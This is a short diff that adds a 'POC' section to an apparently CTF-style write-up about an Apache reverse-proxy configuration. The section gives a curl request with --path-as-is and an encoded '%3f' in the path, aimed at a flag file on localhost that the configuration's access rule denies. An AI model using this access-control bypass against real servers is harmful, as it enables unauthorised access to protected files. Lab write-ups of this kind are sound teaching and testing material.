@@ -27,3 +27,8 @@ ProxyPassReverse / http://backend:3000/
     Require all denied
 </Directory>
 ```
+
+### POC
+``` bash
+curl --path-as-is 'http://127.0.0.1:8084/flag%3f.png'
+```
